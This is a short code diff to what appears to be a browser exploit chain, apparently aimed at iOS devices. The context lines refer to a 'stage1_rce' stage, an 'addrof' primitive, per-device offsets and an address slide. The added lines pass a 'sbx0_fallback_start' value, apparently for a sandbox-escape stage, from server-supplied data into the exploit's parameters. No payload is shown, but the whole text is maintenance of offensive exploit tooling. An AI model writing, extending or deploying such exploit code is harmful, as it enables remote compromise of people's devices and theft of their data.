@@ -9443,6 +9443,7 @@ const device_chipset = {
           };
           p.device_model = device_model;
           p.chipset = chipset;
+          p.sbx0_fallback_start = isFinite(globalThis.__ls_sbx0_fallback_start) ? globalThis.__ls_sbx0_fallback_start : 0;
           globalThis.device_model = p.device_model;
           p.offsets = offsets;
           p.slide = slide;
@@ -10224,6 +10225,8 @@ async function main() {
         {
             host = data.desiredHost;
             SERVER_LOG = data.SERVER_LOG;
+            globalThis.__ls_sbx0_fallback_start = parseInt(data.sbx0_fallback_start, 10);
+            if (!isFinite(globalThis.__ls_sbx0_fallback_start)) globalThis.__ls_sbx0_fallback_start = 0;
             print("inside stage1_rce from worker");
             main().then(async (p_temp) => {
               if(!p_temp.addrof)
